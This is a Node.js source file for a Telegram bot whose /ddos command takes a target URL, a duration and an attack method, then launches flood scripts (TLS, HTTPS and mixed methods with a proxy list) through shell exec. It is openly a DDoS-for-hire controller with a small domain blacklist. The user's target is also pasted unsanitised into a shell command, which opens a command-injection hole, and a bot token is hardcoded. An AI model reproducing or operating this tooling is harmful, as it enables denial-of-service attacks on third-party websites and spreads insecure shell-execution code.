const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

const token = '7392967430:AAEWky63is69WKIy0DIMbXKkObDLcBNtD4M'; // Replace with your bot token
const bot = new TelegramBot(token, { polling: true });

const cooldowns = new Map();
const blacklistedDomains = ['google.com', 'tesla.com', 'fbi.gov', 'youtube.com', 'lahelu.com'];

bot.onText(/\/ddos (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1].split(' ');

  if (args.length < 3) {
    return bot.sendMessage(chatId, '```[🔎] /ddos [url] [duration] [methods]```');
  }

  const target = args[0];
  const duration = args[1];
  const methods = args[2];

  if (blacklistedDomains.some(domain => target.includes(domain))) {
    return bot.sendMessage(chatId, '❌ Blacklisted Target.');
  }

  const details = `│ Creator: PermenMD\n│ Target: ${target}\n│ Methods: ${methods}\n│ Duration: ${duration}\n│ Check-Host: [Click Here](https://check-host.net/check-http?host=${target})`;

  const messageOptions = {
    parse_mode: 'Markdown',
    disable_web_page_preview: false,
    reply_markup: {
      inline_keyboard: [
        [{
          text: 'Check Host',
          url: `https://check-host.net/check-http?host=${target}`
        }]
      ]
    }
  };

  bot.sendMessage(chatId, details, messageOptions);

  let command;
  switch (methods) {
    case 'tls':
      command = `node ./lib/PermenMD/StarsXTls.js ${target} ${duration} 100 10`;
      break;
    case 'ninja':
      command = `node ./lib/PermenMD/StarsXNinja.js ${target} ${duration}`;
      break;
    case 'https':
      command = `node ./lib/PermenMD/StarsXHttps.js ${target} ${duration} 100 10 proxy.txt`;
      break;
    case 'mix':
      command = `node ./lib/PermenMD/StarsXMix.js ${target} ${duration} 100 10 proxy.txt`;
      break;
    default:
      return bot.sendMessage(chatId, '_*Unknown Methods*_');
  }

  exec(command, (error, stdout, stderr) => {
    if (error) {
      console.error(`exec error: ${error}`);
      return bot.sendMessage(chatId, `Error: ${error.message}`);
    }
    if (stderr) {
      console.error(`stderr: ${stderr}`);
      return bot.sendMessage(chatId, `Error: ${stderr}`);
    }
    console.log(`stdout: ${stdout}`);
  });
});

bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  // other message handling logic
});
